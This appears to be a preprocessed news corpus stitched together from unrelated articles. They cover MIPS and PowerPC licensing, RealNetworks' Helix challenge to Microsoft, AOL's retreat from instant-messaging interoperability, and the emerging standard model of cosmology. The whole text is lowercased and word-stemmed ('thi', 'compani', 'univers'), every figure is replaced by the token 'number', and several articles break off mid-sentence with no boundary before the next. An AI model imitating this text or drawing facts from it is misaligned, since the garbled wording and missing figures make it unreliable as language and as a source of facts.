mai onc have been written off as interest experi back by ventur capitalist who overlook some of the finer detail like softwar compat what lend them respect is mip their for the ask on reason young processor compani seem to be flock to the platform is that it steward mip technolog inc ha no qualm about licens the instruct set architectur isa provid that the license agre to meet a softwar compat test suit by contrast processor core rival arm ltd ha grant thi privileg to just two of it mani license intel and motorola and so far the two powerpc vendor ibm corp and motorola inc have rebuf most request to licens that architectur with the notabl except be fpga vendor xilinx inc which ha licens the number powerpc from ibm the mip isa is also on of the simplest form of reduc instruct set comput around which tend to make it attract to processor design interest in extend the architectur it wa thi and the wide avail of tool and softwar that drew intrins to mip even though the compani is aim at powerpc socket as evidenc by it decis to adopt the rapidio interfac instead of hypertransport which ha been favor by mip vendor good fit it s a nice clean architectur and ha an open model that allow us to add instruct said paul nixon chief execut offic of intrins you also get all the third parti tool that veri easili fit into our base of platform there wa a time when thi open wa seen as a liabil for mip in the mid number befor mip wa spun out from silicon graphic inc the instruct set lack a multipli add instruct so some mip vendor took it upon themselv to creat their own the problem wa that thi broke mani of the develop tool caus headach for compil vendor like green hill softwar inc we went to mip and said we have number differ compil variant and it s embarrass said craig franklin vice presid of engin at green hill and a respect microprocessor industri veteran franklin also wasn t shy about tell mip it need to revamp it embed applic binari interfac we went to mip and said we ve done a dozen eabi let s clean up your he said mip took the advic and wast littl time clamp down on architectur deviat observ said but the mip camp still ha to live with a legaci of incompat chip in the field to it credit mip quickli caught on said jim turlei a microprocessor industri analyst go forward mip is maintain good control but thei ar still haunt by incompat among multipl if the biggest risk to the mip camp is fragment then the powerpc camp ha the opposit problem architectur confin though the powerpc architectur carri the cachet of household name motorola and ibm these ar essenti the onli two compani that provid powerpc it s not for lack of interest rather the compani have been reluct to cede control over the architectur thi could wind up hurt the powerpc caus though to get a powerpc licens is imposs or veri expens green hill franklin said tactic thi mai have been a mistak if you re a japanes compani all thing be equal you d rather bui from anoth japanes compani analyst turlei too think the powerpc camp will onli stand to gain by licens the architectur it s all about softwar compat and tool support the more you can prolifer the architectur the better you re go to do he said i don t think motorola and ibm can address the entir market by themselv there s a chanc that thi could chang ibm for it part is in the process of plan an expans strategi for powerpc that mai involv more licens though it s unlik the powerpc camp will ever have the open licens model of mip technolog mip processor vendor mai have more than just two competitor to worri about we re certainli not avers to licens said lisa su director of powerpc product at ibm the question is how much do we do and who do we licens to there ar variou wai you could go whether it s a hard core soft core or licens the isa but the fear of architectur fragment still loom larg we know that if we have differ microarchitectur we have to do work on softwar compat su said with mip there s a degre of fractur that mai not alwai be a big problem but if you go to other market like consum it becom big our belief is there is a happi medium whatev path ibm take it will act in it own best interest as a chip provid not as a compani that

 thi is a veri tenuou time for microsoft gartenberg said thi is not a time in microsoft s histori when it can be seen as try to do to real what it did to netscap rrrrrrriiiiiight httpaddr juli number number realnetwork pose challeng to microsoft by john markoff san francisco juli number in a signific challeng to microsoft realnetwork plan to announc a new version of it softwar on mondai that can distribut audio and video in a rang of format includ microsoft s own proprietari window media the new softwar is intend for larg media compani and other corpor that need to send audio and video data to custom and employe in a varieti of differ format but realnetwork acknowledg that it wa possibl that the compani might incur microsoft s legal wrath nevertheless rob glaser a former microsoft execut who found realnetwork as progress network in number said he believ the strategi wa good for both microsoft and consum a ration wai for them to respond would be to sai thi is great he said that would be microsoft of the futur mr glaser said hi compani base in seattl had develop a version of the microsoft media server softwar that come with the window oper system he said realnetwork engin had studi the data that wa sent between the microsoft media server softwar and the window media player program and recreat the technolog need to plai file in the microsoft format thi method creat a so call clean room version mean the develop built the transmiss softwar without ani knowledg about the underli program microsoft ha adopt a similar strategi at sever junctur mr glaser said revers engin technolog like netwar postscript and javascript at differ time microsoft execut said the compani current licens the window media player technolog to a varieti of compani includ yahoo realnetwork and the america onlin unit of aol time warner but a microsoft execut said that a clean room copi of the window server technolog could lead to qualiti and perform issu it s kind of hard to specul about the technolog until we see it said dave fester the gener manag of the window media divis if a compani ha not licens the server softwar he ad we would need to look at it and see what thei re do realnetwork appear to be endeavor to avoid be netscap a refer to the fate that befel the netscap commun corpor when microsoft decid to make an internet browser which wa pioneer commerci by netscap a standard part of the window oper system netscap wa later acquir by aol time warner microsoft s decis to build an internet browser into window and give it awai at no addit cost led directli to a bitter antitrust lawsuit brought by the justic depart in number realnetwork which wa a pioneer in the market for stream media to desktop person comput ha been under grow pressur from microsoft which is give awai both the server and window media player program as part of it oper strategi realnetwork also face challeng from appl comput which offer the quicktim media player as a part of it macintosh os x oper system and sell a more full featur player moreov in recent month macromedia inc which make the flash anim softwar us on mani web site ha ad video capabl to it technolog make it a potenti rival realnetwork is gambl that with a prolifer of differ standard and format for video and audio the media corpor that make content avail over the internet will flock to a singl system that support multipl type of data the compani is try to shift the focu of the competit from the pc desktop to the server accord to analyst sever analyst said the realnetwork shift in strategi could put microsoft on the defens real ha got the experi and sophist to pull thi off said richard doherti the presid of envision a market research and consult firm base in seaford n y it will open up a new hors race until now the compani have been engag in a technolog war to rapidli increas the power and qualiti of each of their media player at the same time thei have compet over which of the program ar place on the desktop of person comput user realnetwork claim to have number number subscrib for pai servic but it is perceiv as be increasingli vulner accord to some analyst becaus microsoft ha includ it media player as part of the window oper system which domin the pc market there ar dozen of data format for plai audio and video on the internet but the domin on ar realaudio and realvideo from realnetwork quicktim from appl window media from microsoft and the industri digit movi standard mpeg number and mpeg number microsoft and realnetwork ar current lock in a close race for desktop media player leadership in the first quarter of thi year accord to survei data collect by jupit research a market research firm base in new york realnetwork realon player had a number number percent share of media player while microsoft s window media player had a number number percent share appl s quicktim player wa third with a number number percent the new server softwar from realnetwork is part of a version of the compani s media server that is to be introduc on mondai and which will be call the helix univers server realnetwork said it would offer perform data base on a test it financ at an independ test servic keylab that indic that the helix softwar can under some condit deliv up to four time the speed of the window media server in microsoft s oper system softwar server ar program that run on power comput and can send stream of digit inform to mani comput user simultan at a new confer schedul to be held in san francisco realnetwork is also expect to announc that it plan to make the helix softwar avail as part of a strategi known as commun sourc which will make it possibl for realnetwork partner and competitor to take advantag of the origin programm instruct realnetwork is to announc a rang of partner includ hitachi hewlett packard i b m deutsch telekom nec nokia cisco system oracl sun microsystem palm texa instrument and other these partner could then incorpor the softwar into their own hardwar and softwar product under the licens strategi compani will be abl to freeli gain access to the underli code that the helix program is base on but thei will still pai a licens fee when thei sell commerci product base on the technolog the commun sourc approach to softwar which wa pioneer by sun to distribut it java program languag is a variat upon the origin free softwar or open sourc approach which ha confound the softwar industri in recent year while open sourc softwar can be freeli share with some restrict the commun sourc approach is more restrict and yet still tri to persuad other to collabor and add innov idea other larg technolog compani includ sun i b m and appl have all now adopt variat on such open sourc strategi with vari result in sun s case the compani ha been critic becaus while java ha becom an industri standard the compani ha not been the princip financi beneficiari in mani case realnetwork is try to strike a balanc between open up it technolog to persuad other to particip and innov and not lose control of the technolog entir mr glaser said we think we ve struck the balanc well he said analyst said the strategi shift by realnetwork wa like to shake up the industri the moment you ve open sourc someth you ve corner your competitor said matthew berk an analyst a jupit research to date thi stuff ha been veri proprietari open it up make it access to creativ and gift programm who will come up with wild stuff that the compani have never consid mr glaser said he expect other compani to produc technolog that would rival realnetwork commerci as a result of the commun sourc strategi on possibl is that compani such as sun or i b m could decid to add the helix technolog of realnetwork as a standard compon of their oper system although realnetwork might not get a signific financi benefit from such an arrang it could contribut to make it helix softwar a de facto industri standard mr glaser said he had struck upon the idea of make hi media server softwar open sourc while visit with an execut from nokia the world s largest cellphon maker take all of thi stuff beyond the pc ha been a huge motiv for us he said when he realiz that nokia wa interest in deploi the softwar technolog on as mani as number to number differ type of phone he realiz that realnetwork did not have enough program talent to support the effort i told him i don t think we have enough

microsoft s window media technolog the new campaign dub helix and first report by the new york time mark on of the most ambiti move in the compani s histori realnetwork is simultan releas technolog

share diminish to regain momentum and support across an industri where mani other player remain skeptic of microsoft s power it s a veri bold move on the part of real said michael gartenberg a research director for analyst firm jupit research thi wa a shot fire by real and fire directli at redmond the move is the latest in a seri of strateg twist and turn that ha made realnetwork on of the onli compani to surviv direct microsoft competit for year while the compani ha expand into paid subscript content busi it softwar and stream media infrastructur have been under increas pressur from microsoft which ha deem multimedia to be on of the major drive under the latest version of it window oper system real s helix announc mainli involv the technolog that allow media file to move from

break those bottleneck and make converg realli converg to make the new product compat with microsoft file howev the compani pursu a riski strategi known as revers engin in which develop examin a competitor s product to see how it work and try to creat someth that work just like it glaser said that engin work entir in a clean room environ mean that thei had no access to actual microsoft code had thei simpli copi code thei could be liabl for patent infring the result product simpli mimic the wai that microsoft s file ar sent across network and allow a window media player to receiv the file other compani have been su for simpli copi a competitor s code and put it in their own product but realnetwork sai it s not worri about microsoft lawsuit becaus it took precaut to do all develop in the clean room environ microsoft itself ha engag in thi kind of legal revers engin analyst sai microsoft which still face antitrust lawsuit is in no posit to sue in ani case thi is a veri tenuou time for microsoft gartenberg said thi is not a time in microsoft s histori when it can be seen as try to do to real what it did to netscap the influenti giant certainli mondai s announc acknowledg microsoft s influenc in media technolog someth glaser and real have often been loath to do microsoft wa quick to spin mondai s announc as further valid of it strength in the marketplac it s an admiss of realnetwork that it s import for them to support window media and that we re now the lead player among home and work user said michael aldridg lead product manag for microsoft s window digit media divis aldridg ad that realnetwork current ha a licens agreement for it media player to support window audio and video format howev realnetwork and microsoft do not have an agreement to allow the server to deliv window media format to end user which is what realnetwork try to do aldridg declin to comment on realnetwork replic of microsoft s technolog in addit to it own new product real ha promis to give awai sourc code to much of the underli technolog for stream media that stop short of the actual file format or codec itself but will provid the open sourc commun and other compani with power new tool to build their own stream media player or softwar glaser said he wouldn t initi make the softwar code that mimic microsoft s stream avail but that he wa consid the idea a first chunk of code underli the realnetwork multimedia player softwar will be releas in number dai other code includ the basic function of it stream media server and encod will be releas by the end of the year the compani said the compani s plan to reveal it sourc code the basic instruct underli the softwar echo similar move made by netscap commun to defend against microsoft in march number netscap took the bold step of open it sourc code to allow softwar develop to help creat the next gener of it popular browser jame barksdal then ceo of netscap said the move would allow the compani to tap into a virtual unlimit develop talent pool instead the effort which ha evolv into the mozilla org project hit consider roadblock and microsoft overtook netscap in market share emailaddr sig doubl plai we have done a great job of have team work around the clock to deliv secur fix for ani problem that aris our respons ha been unmatch but as an industri leader we can and must do better go forward we must

 i suppos the main surpris here is that aol is come clean at all after all it long run game of talk interop and do everyth possibl to prevent open standard in thi arena seem to have been work fine with most end user complet oblivi to aol s action httpaddr number onnumb htm america onlin scale back instant messag compat effort updat tuesdai juli number number number number pm et dow jone newswir new york america onlin appear to be scale back effort to make it instant messag servic compat with rival servic the unit of aol time warner inc aol new msg said in a regulatori file it is now focus on messag interoper method that ar more limit in scope than the kind envis by the feder commun commiss when it approv the aol time warner merger in januari number america onlin isn t requir to make it messag system interoper with other but the fcc s merger approv includ what it consid to be incent for the compani to do so it also requir aol to file progress report on it interoper effort everi six month the most recent report file last week disclos the compani s new direct the upshot of the strategi shift is that the instant messag market isn t much closer to broad base interoper than it wa number month ago accord to industri analyst unlik e mail user of most compet instant messag servic still can t directli trade messag so an america onlin instant messag user can t commun with a user of microsoft corp s msft new msg msn messeng except by us third parti softwar such as trillian america onlin the biggest instant messag provid ha been critic for block user of rival servic from gain access to it user the compani also ha been accus of drag it feet amid industri attempt at interoper for it part america onlin ha said it want to protect the secur of it user and the reliabl of it system and it point out that other compani have so far fail to agre on interoper standard when the fcc approv the aol time warner merger it said that if america onlin want to offer video conferenc and other advanc instant messag featur over time warner s cabl line it first had to enabl it instant messag user to commun with user of rival servic the intent of the condit wa to prevent america onlin from widen it domin of the instant messag market by exploit it access to time warner cabl system aol hasn t yet introduc video featur even though rival microsoft and yahoo inc yhoo new msg did so last year specif the fcc said america onlin would have to implement a technolog known as server to server interoper befor it could offer video the technolog would allow user of non america onlin servic to detect when aol user ar onlin and to trade messag it would do so via commun between the comput server oper by each messag provid us a common languag but in the progress report file with the fcc last week america onlin said it will focu it effort on altern to server to server interoper thei ar more limit in scope than server to sever as an exampl of an altern america onlin cite a recent agreement to make it instant messag servic compat with a new messag servic from appl comput corp aapl new msg the appl servic ichat will be includ in mac os x number number the new appl oper system set for releas in august ichat user will be abl to talk to america onlin user but it won t involv server to server interoper instead the actual exchang of messag will occur onli on america onlin s server even as ichat custom us appl softwar we believ thi kind of host im solut provid at least in the short term a secur reliabl and cost effect mean to provid interoper between aol im and unaffili im commun steven teplitz aol s associ gener counsel wrote in the progress report to the fcc as to the appar chang in strategi compani spokeswoman kathi mckiernan said tuesdai it s a recognit that server to server ha proven a hard nut to crack for the entir industri inde user of america onlin s rival servic can t directli commun with each other either the altern solut wa someth that we could implement now to provid for im commun to commun said ms mckiernan ad america onlin would explor partnership with other messag provid similar to the appl deal none ha been announc so far fcc offici couldn t be reach tuesdai america onlin hasn t rule out the possibl that it would somedai implement server to server interoper the compani ha explor the technolog in the past includ a server to server last year with lotu develop a unit of intern busi machin corp ibm new msg but america onlin s interoper test with lotu wa limit in scope and function true server to server technolog would requir further signific expenditur of time and resourc to develop wrote mr teplitz the internet engin task forc a group devot to develop internet standard ha been work on a server to server messag technolog but hasn t yet develop a final version accord to america onlin task forc repres couldn t be reach the compani s strategi shift mean that true interoper in instant messag is still a coupl of year awai accord to michael gartenberg analyst with jupit research it s still someth the market want he said at some point it ll happen but mayb a coupl of year down the road mr gartenberg and other analyst believ america onlin hasn t activ pursu true interoper becaus it want to protect it larg user base if messag system were compat the compani could lose ground becaus prospect custom might see no differ in choos anoth provid as long as thei can reach america onlin user but partli becaus of it lack of compat and the fcc condit america onlin hasn t kept up with rival in offer new servic msn and yahoo have had video conferenc via instant messag sinc last year aol ha deni that it ha held back on video messag to avoid make it system interoper argu there is littl consum demand for it but the new featur have paid off for the compani s rival and thei ar catch up between last octob and april microsoft s messeng user base rose number to number number million accord to comscor media metrix while yahoo s

cosmologist confin to a dust mote lost in space pronounc judgment on the fate of the univers or the behavior of galaxi billion of light year awai with onli a few scrap of light as evid cosmologist ar often wrong the russian physicist lev landau put it but never in doubt for most of the numberth centuri cosmolog seem less a scienc than a religi war over sai whether the univers had a begin in a fieri big bang billion of year ago or whether it exist etern in the so call steadi state in the last few year howev a funni thing ha happen cosmologist ar begin to agre with on anoth bless with new instrument like the hubbl space telescop and other space base observatori a new gener of their giant cousin on the ground and ever faster comput network cosmolog is enter a golden ag in which data ar final outrun specul the rate at which we ar learn and discov new thing is just extraordinari said dr charl bennett an astronom at the goddard space flight center in greenbelt md as a result cosmologist ar begin to converg on what thei call a standard model of the univers that is tower in it ambit it purport to trace at least in broad stroke cosmic histori from the millisecond after time began when the univers wa a boil stew of energi and subatom particl through the format of atom star galaxi and planet to the vast dilut dark futur in which all of these will have di the univers the cosmologist sai wa born number billion year ago in the big bang most of it materi remain resid in huge cloud of invis so call dark matter perhap elementari particl left over from the primordi explos and not yet identifi within these invis cloud the glitteri light in the sky that have defin creation for gener of human ar swamp like fleck of foam on a roll sea a good case can be made scientist now agre that the univers will go on expand forev in fact recent observ have suggest that the expans of the univers is speed up over cosmic time under the influenc of a dark energi even more mysteri than dark matter recent a group of astronom led by dr william perciv at the univers of edinburgh combin data from a varieti of observ to compil base on the simplest theoret model what thei sai is the most precis enumer yet of the paramet that cosmologist have been fight about for all these decad the univers thei calcul is number number billion year old plu or minu half a billion year onli number number percent of it is made of ordinari matter matter of all type known and unknown lumin and dark account for just number number percent the rest of creation number number percent is the mysteri dark energi thei report in a paper submit last month to the monthli notic of the royal astronom societi it is a pictur that in some wai is surprisingli simpl satisfi long held theoret prejudic about how the univers should be design continu agreement with come experi mai mean that scienc is approach the end of a great program of cosmolog test that began in the number s dr p j e peebl of princeton and dr bharat ratra of kansa state univers said in the draft of a come articl for the review of modern physic in other wai thi new dark univers is utterli baffl a road map to new mysteri dr marc davi a cosmologist at the univers of california at berkelei call it a univers chock full of exot that don t make sens to anybodi moreov there ar some question that scientist still do not know how to ask let alon answer scientif wa there anyth befor the big bang is there a role for life in the cosmo why is there someth rather than noth at all will we ever know we know much but we still understand veri littl said dr michael turner a cosmologist at the univers of chicago the big question expand forev or big crunch the dim cave of lascaux the plain of stoneheng and the dreamtim tale of australian aborigin all testifi to the need to explain the world and exist thi quest took it present form in number that wa when albert einstein took hi new gener theori of rel which explain how matter and energi warp space time to produc graviti and appli it to the univers einstein discov that the cosmo as hi theori describ it would be unstabl prone to collaps under it own graviti astronom howev were sure that the univers wa stabl so einstein ad a fudg factor that he call the cosmolog constant to hi equat it act as a long rang repuls forc to counterbal graviti in number the astronom edwin hubbl discov that the univers wa expand the sky wa full of distant galaxi all rush awai from us and on anoth as if propel by what the british astronom dr fred hoyl later call deris a big bang the univers wa not stabl and thu did not requir counterbalanc einstein abandon hi constant refer to it as hi biggest blunder but it would return to haunt cosmologist and the univers hoyl s term stuck and the notion of an explos genesi becam orthodoxi in number when dr arno penzia and dr robert wilson radio astronom at bell laboratori discov a faint uniform radio glow that pervad the sky it wa cosmologist conclud the fade remnant of the primordi firebal itself reliev of their fudg factor the equat describ einstein s univers were simpl dr allan sandag the carnegi observatori astronom onc call cosmolog the search for two number on the hubbl constant tell how fast the univers is expand and the other tell how fast the expans is slow and thu whether the univers will expand forev or not the second number known as the deceler paramet indic how much the cosmo had been warp by the densiti of it content in a high densiti univers space would be curv around on itself like a ball such a univers would eventu stop expand and fall back togeth in a big crunch that would extinguish space and time as well as the galaxi and star that inhabit them a low densiti univers on the other hand would have an opposit or open curvatur like a saddl harder to envis and would expand forev in between with no overal warpag at all wa a goldilock univers with just the right densiti to expand forev but more and more slowli so that after an infinit time it would coast to a stop thi wa a flat univers in the cosmolog parlanc and to mani theorist the simplest and most mathemat beauti solut of all but the sky did not yield those cosmic number easili even with the help of the number inch hale telescop on palomar mountain in southern california dedic in number which had been built larg for that task dr hubbl wrote of measur shadow and search among ghostli error of measur for landmark that ar scarc more substanti the dark side invis matter mold galaxi it wa not till the mid number s a quarter centuri after the palomar giant began oper that group of astronom reach the tent conclus that the univers thei could see star ga planet and galaxi did not have nearli enough gravit oomph to stop the cosmic expans so the univers will continu to expand forev and galaxi will get farther and farther apart and thing will just die dr sandag said at the time but the great argument wa just begin appar there wa a lot of the univers that astronom could not see the star and galaxi were move as if immers in the graviti of giant invis cloud of so call dark matter miss matter the swiss astronom dr fritz zwicki label it in the number s mani galaxi for exampl ar rotat so fast that thei would fly apart unless thei were be rein in by the graviti of halo of dark matter accord to pioneer observ by dr vera rubin of the carnegi institut of washington and her colleagu her measur indic that these dark halo outweigh the visibl galaxi themselv from number to number time but there could be even more dark matter farther out in space perhap enough to stop the expans of the univers eventu some theorist suggest lumin matter the darth vader of the sky said is like the snow on mountaintop but what is the dark matter while some of it is ga or dark dim object like star and planet cosmologist specul that most of it is subatom particl left over from the big bang mani varieti of these particl ar predict by theori of high energi physic but their exist ha not been confirm or detect in particl acceler we theorist can invent all sort of garbag to fill the univers dr sheldon glashow a harvard physicist and nobel laureat told a gather on dark matter in number collect known as wimp s for weakli interact massiv particl such particl would not respond to electromagnet the forc respons for light and thu would be unabl to radiat or reflect light thei would also be rel slow move or cold in physic jargon and thu also go by the name of cold dark matter as earth in it travel pass through the dark matter cloud that presum envelop the milki wai the particl would shoot through our bodi rare leav a trace like moonlight through a window but the collect graviti of such particl cosmologist sai would shape the cosmo and it content gather along the fault line laid down by random perturb of densiti in the earli univers dark matter would congeal into cloud with about the mass of number number sun the ordinari matter that wa mix in with it would cool and fall to the center of the cloud and light up as star the cloud would then attract other cloud through a seri of merger over billion of year smaller cloud would assembl into galaxi and the galaxi would then assembl themselv into cluster of thousand of galaxi and so forth us the hubbl and other telescop as time machin light travel at a finit speed so the farther out astronom look the farther back in time thei see cosmologist have begun to confirm that the univers did assembl itself from the bottom up as the dark matter model predict last year two team of astronom report see the first star burn their wai out of the cloudi aftermath of the big bang when the univers wa onli number million year old the bulk of galaxi format occur when the univers wa a half to a quarter it present ag cosmologist sai the big new in the last decad is that even half a univers ago the univers look pretti differ said dr alan dressler of the carnegi observatori in pasadena galaxi befor then were small and irregular with no sign of the majest spiral spider web that decor the sky todai we would bare recogn our own milki wai galaxi if we could see it five billion year ago when the sun form he said by eight billion year back it would be unrecogniz said dr dressler yet there ar still mani question that the cold dark matter model doe not answer astronom still do not know for exampl how the first star form or why the model of dark matter distribut don t quit fit in the core of some kind of galaxi nor have the dark matter particl themselv been unambigu detect or identifi despit continu experi some astronom suggest that the discrep stem from the inabl of simpl mathemat model to deal with messi detail of the real world it s a huge mysteri exactli how star form dr richard bond of the canadian institut for theoret astrophys said we can t solv it now so it s even harder to try to solv them back then but other notabl dr mordehai milgrom a theorist at the weizmann institut in israel have suggest that modifi the gravit law by which dark matter wa deduc in the first place would allevi the need for dark matter altogeth the bang s fuel inflat on ounc to a whole univers clue to what had actual explod in the big bang emerg as an unexpect gift from anoth great scientif quest physicist pursuit for a so call theori of everyth that would unit all physic phenomena in a singl equat unabl to build machin power enough to test their most ambiti notion on earth some theorist turn to the sky the big bang is the poor man s particl acceler dr jakob zeldovich an influenti russian cosmologist said physicist recogn four forc at work in the world todai graviti electromagnet and the strong and weak nuclear forc but thei suspect base on data from particl acceler and high power theori that those ar simpli differ manifest of a singl unifi forc that rule the univers in it earliest hottest moment as the univers cool accord to thi theori there wa a fall from grace and the law of physic evolv with on forc after anoth freez out or split awai in number dr alan guth now at the massachusett institut of technolog realiz that a hypothes glitch in thi process would have had drastic consequ for the univers under some circumst a glass of water can stai liquid as the temperatur fall below number degre until it is disturb at which point it will rapidli freez releas latent heat in the process similarli the univers could supercool and stai in a unifi state too long in that case space itself would becom temporarili imbu with a mysteri kind of latent heat or energi insert into einstein s equat the latent energi would act as a kind of antigrav and the univers would blow itself apart dr guth discov in a calcul in number in far less than the blink of an ey number number second a speck much smaller than a proton would have swollen to the size of a grapefruit and then resum it more state expans with all of normal cosmic histori befor it result in todai s observ univers a patch of sky and star number billion light year across all by the magic seem logic of einstein s equat from about an ounc of primordi stuff the univers dr guth like to sai might be the ultim free lunch dr guth call hi theori inflat inflat as dr guth point out explain why the univers is expand dr turner of the univers of chicago refer to it as the dynamit behind the big bang as modifi and improv by dr andrei lind now at stanford and by dr paul steinhardt now at princeton and dr andrea albrecht now at the univers of california at davi inflat ha been the workhors of cosmolog ever sinc on of it great virtu cosmologist sai is that inflat explain the origin of galaxi the main citizen of the cosmo the answer come from the paradox sound quantum rule that govern subatom affair on the smallest scale accord to quantum theori natur is lumpi emit even energi in littl bit and subject to an irreduc random as a result so call quantum fluctuat would leav faint lump in the earli univers these would serv as the gravit seed for futur galaxi and other cosmic structur as a result of such success cosmologist have stuck with the idea of inflat even though lack the abil to test their theori at the high energi of the big bang thei have no precis theori about what might have actual caus it inflat is actual a class of theori said dr guth in the latest version call chaotic inflat dr lind ha argu that quantum fluctuat in a myriad of theoriz forc field could have done the trick inde he and other now sai thei believ that inflat can occur over and over spawn an endless chain of univers out of on anoth like bubbl within bubbl the univers inflat on top of itself dr lind told a physic confer thi spring in princeton it s happen right now the golden ag new devic detect primordi glow if the inflationari theorist ar right the univers we see the number billion light year is just a tini piec of a much vaster univers or even a whole ensembl of them forev out of our view accord to the theori therefor our own littl patch of the cosmo should appear geometr flat the wai a section of a balloon look flat when view close up thi wa the univers long thought to be the most beauti and simpl but it requir by the logic of einstein s gener rel that there be much more dark matter or someth to the univers enough to flatten space time than astronom had found in fact thi prescript wa so hard to reconcil with other observ of galaxi and their evolut that by number some astronom and press report suggest that the entir theoret edific of inflat to blow up the univers and cold dark matter to fill it not to sai the big bang itself might have to be junk so it wa with a sigh of relief that cosmologist greet the announc in april number that nasa s cosmic background explor or cobe satellit had succeed in discern faint blotch in the primordi cosmic radio glow these were the seed from which inflat predict larg cosmic structur would eventu grow if you re religi it s like see god said dr georg smoot a physicist from the lawrenc berkelei nation laboratori who led the cobe team astronom sai cobe signal a transit in which heroic idea about the univers began to be replac by heroic data as long plan new telescop and other instrument went into oper a year later skywalk astronaut correct the hubbl telescop s myopic vision the cosmic background radiat ha come in for particular scrutini from new radio telescop mount in balloon and on mountaintop the new ha been good though not decis for inflat for three year a seri of increasingli high resolut observ ha confirm that the pattern of blotch stippl the remnant of the primordi firebal is consist with the predict from inflat and cold dark matter the instrument have now map detail small enough to have been the seed of modern cluster of galaxi i m complet snow by the cosmic background radiat dr guth said the signal wa so weak it wasn t even detect until number and now thei re measur fluctuat of on part in number number perhap most import the analysi of the fluctuat indic that the univers ha a flat geometri as predict by inflat that wa a triumph although observ could not prove that inflat wa right a nonflat univers would have been a blow to the theori and to cosmolog orthodoxi inflat our boldest and most promis theori of the earliest moment of creation pass it first veri import test dr turner said at the time the most precis measur of the cosmic background at least in the near futur ar gener expect to come late thi year from nasa s microwav anisotropi project or map satellit which wa launch into space last year on june number map will be follow by the european space agenc s planck satellit in number it is highli unlik that map or planck will be abl to detect what dr turner call the smoke gun signatur of inflat the violent stretch of the univers should roil space time with so call gravit wave that would leav a faint imprint on the cosmic firebal detect those wave would not onli confirm inflat but also might help scientist establish what caus the inflat in the first place give scienc it first look at the strang physic that prevail when creation wa onli about a trillionth of a trillionth of a trillionth of a second old the univers s fate bleak implic of dark energi in number two compet team of astronom startl the scientif world with the new that the expans of the univers seem to be speed up under the influenc of a mysteri antigrav that seem embed in space itself and that is hauntingli reminisc of einstein s old presum discredit cosmolog constant dark energi the phenomenon wa quickli name if dark energi is real and the acceler continu the galaxi will eventu speed awai from on anoth so quickli that thei couldn t see on anoth the univers would becom cold and empti as the continu acceler suck awai the energi need for life and thought it would be the worst possibl univers for the qualiti and quantiti of life said dr lawrenc krauss a physicist at case western reserv univers dr edward witten of the institut for advanc studi in princeton call the discoveri of dark energi the strangest experiment find sinc i ve been in physic the discoveri wa a surpris to the astronom involv neither team had expect to find the univers acceler thei had each set out to measur by how much the expans of the univers wa slow becaus of the graviti of it content and thu settl the question of it fate on team wa led by dr saul perlmutt a physicist at lawrenc berkelei the other team wa a band of astronom led by dr brian schmidt of mount stromlo and the side spring observatori in australia each group emploi far flung network of telescop includ the hubbl and the internet to find and monitor certain explod star or supernova as cosmic beacon such explos the death rattl of massiv star ar power enough to be seen clear across the univers when the univers wa younger and presum expand faster leapfrog each other across the univers the two team propiti for their credibl arriv at the same answer at the same time the cosmo wa not slow at all it wa speed up dr perlmutt who had onc resent the competit conced with onli on group it would have been a lot harder to get the commun to bui into such a surpris result thi wa a veri strang result said dr adam riess a member of dr schmidt s team it wa the opposit of what we thought we were do the result have sent einstein s old cosmolog constant to the forefront of cosmolog despit hi disavow the constant had never realli gone awai and had in fact been given new life by quantum physic einstein had famous reject quantum s random sai god didn t plai dice but it justifi in retrospect hi fudg factor accord to the uncertainti principl a pillar of quantum theori empti space wa not empti but rather foam with the energi of so call virtual particl as thei flash in and out of exist on borrow energi thi so call vacuum energi could repel just like einstein s old cosmolog constant or attract the case for dark energi got even stronger a year later when the cosmic background observ report evid of a flat univers becaus astronom had been abl to find onli about a third as much matter both dark and lumin as wa need by einstein s law to creat a flat geometri someth els had to be ad to it the discoveri of dark energi exemplifi dr zeldovich s view of the univers as the poor man s particl acceler and it caught the physicist flat foot somewhat to the pride of the astronom a come of ag of astronomi dr dressler call it what is dark energi the question now hang over the univers is it realli einstein s old fudg factor return to haunt hi children in that case as the univers expand and the volum of space increas astronom sai the push becaus of dark energi will also increas acceler the galaxi awai from on anoth faster and faster lead to a dire dark futur other physicist howev have point out that the theori of modern physic ar replet with mysteri forc field collect call quintess that might or might not exist but that could temporarili produc neg graviti and mimic the action of a cosmolog constant in that case all bet on the futur ar off the univers could acceler and then deceler or vice versa as the dark energi field rose or fell a third possibl is that dark energi doe not exist at all in which case not just the futur but the whole carefulli construct jigsaw puzzl of cosmolog might be in doubt the effect of cosmic acceler could be mimick astronom sai by unusu dust in the far univers or by unsuspect chang in the characterist of supernova over cosmic time as a result more group ar join the origin two team in the hunt for new supernova and other wai to measur the effect of dark energi on the histori of the univers dr perlmutt ha propos build a special satellit telescop the supernova astronomi project to investig exactli when and how abruptli the cosmic acceler kick in the nag questionsa grand synthesi but hardli complet for all the new answer be harvest some old question linger and thei have now been join by new on a flat univers is the most mathemat appeal solut of einstein s equat cosmologist agre but thei ar puzzl by the specif recip larg help of dark matter and dark energi that natur ha chosen dr turner call it a preposter univers but dr martin ree a cambridg univers cosmologist said that the discoveri of a deeper principl govern the univers and perhap life mai alter our view of what is fundament some featur of the univers that ar now consid fundament like the exact mixtur of dark matter dark energi and regular stuff in the cosmo mai turn out to be mere accid of evolut in on out of the mani mani univers allow by etern inflat if we had a theori then we would know whether there were mani big bang or on dr ree said the answer to these and other question mani scientist suspect have to await the final unif of physic a theori that reconcil einstein s rel which describ the shape of the univers to the quantum chao that live insid it such a theori quantum graviti is need to describ the first few moment of the univers when it wa so small that even space and time should becom fuzzi and discontinu for two decad mani physicist have place their bet for quantum graviti on string theori which posit that elementari particl ar tini string vibrat in a number or number dimension space each kind of particl in a sens correspond to a differ note on the string in principl string theori can explain all the forc of natur but even it adher conced that their equat ar just approxim to an unknown theori that thei call m theori with m stand for matrix magic mysteri or even mother as in mother of all theori moreov the effect of stringi physic ar onli evid at energi forev beyond the limit of particl acceler some string theorist have ventur into cosmolog hope to discov some effect that would show up in the poor man s particl acceler the sky in addit to string the theori also includ membran or brane of variou dimens our univers can be envis as such a brane float in higher dimension space like a leaf in a fish tank perhap with other brane univers nearbi these brane could interact gravitation or even collid set off the big bang in on version suggest last year by four cosmologist led by dr steinhardt of princeton anoth brane would repeatedli collid with our own thei pass back and forth through each other caus our univers to undergo an etern chain of big bang such notion ar probabl the futur for those who ar paid to wonder about the univers and the fruit of thi work could yet caus cosmologist to reconsid their new consensu warn dr peebl of princeton who ha often act as the conscienc of the cosmolog commun try to put the brake on faddish trend he wonder whether the situat todai can be compar to anoth histor era around number when mani peopl thought that 